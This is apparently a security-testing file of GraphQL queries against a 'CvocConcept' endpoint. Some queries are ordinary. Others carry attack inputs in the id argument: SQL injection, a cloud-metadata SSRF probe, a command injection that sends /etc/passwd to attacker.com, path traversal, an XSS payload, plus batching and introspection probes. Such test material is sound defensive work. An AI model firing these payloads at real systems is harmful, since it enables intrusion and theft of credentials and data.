query.query:
query CvocConcept {
  CvocConcept(id: "countries") {
    id
    type
    identifier
    itemCount
  }
}

query CvocConcept {
  CvocConcept(id: "1' UNION SELECT NULL,CAST(table_name AS TEXT),NULL,NULL,NULL FROM information_schema.tables--") {
    id
    type
    identifier
  }
}

query CvocConcept {
  CvocConcept(id: "http://169.254.169.254/latest/meta-data") {
    uri
    links {
      targets
    }
  }
}

query CvocConcept {
  CvocConcept(id: "; curl https://attacker.com/$(cat /etc/passwd) #") {
    type
    systemEvents {
      logMessage
    }
  }
}

query CvocConcept {
  CvocConcept(id: "../../../../etc/passwd") {
    uri
    links {
      description
    }
  }
}

query CvocConcept {
  CvocConcept(id: "<img src=x onerror=alert(1)>") {
    identifier
    descriptions {
      name
    }
  }
}

query CvocConcept {
  CvocConcept(id: "countries") {
    id
    type
    vocabulary {
      id
      name
      description
    }
    annotations {
      body
      field
    }
    systemEvents {
      timestamp
      eventType
    }
  }
}

query CvocConcept {
  a: CvocConcept(id: "countries") {
    id
    type
  }
  b: CvocConcept(id: "countries") {
    itemCount
    vocabulary { id }
  }
  c: CvocConcept(id: "countries") {
    links { id }
    annotations { id }
  }
}

query IntrospectionQuery {
  CvocConcept {
    queryType { name }
    mutationType { name }
    types {
      name
      kind
      fields {
        name
        type { name kind }
      }
    }
  }
}
